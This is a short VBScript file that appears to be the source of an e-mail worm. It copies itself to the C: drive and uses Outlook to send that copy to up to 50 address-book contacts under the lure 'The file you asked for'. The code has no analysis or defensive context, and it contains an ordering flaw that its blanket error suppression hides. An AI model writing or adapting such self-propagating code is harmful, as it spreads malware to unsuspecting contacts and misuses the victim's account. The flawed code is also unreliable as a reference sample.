On Error Resume Next
Dim x
so.GetFile(WScript.ScriptFullName).Copy("C:\dateiname.vbs")
Set so=CreateObject("Scripting.FileSystemObject")
Set ol=CreateObject("Outlook.Application")
For x=1 To 50
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Hi" 
Mail.Body = "The file you asked for" 
Mail.Attachments.Add("C:\dateiname.vbs")
Mail.Send
Next
ol.quit
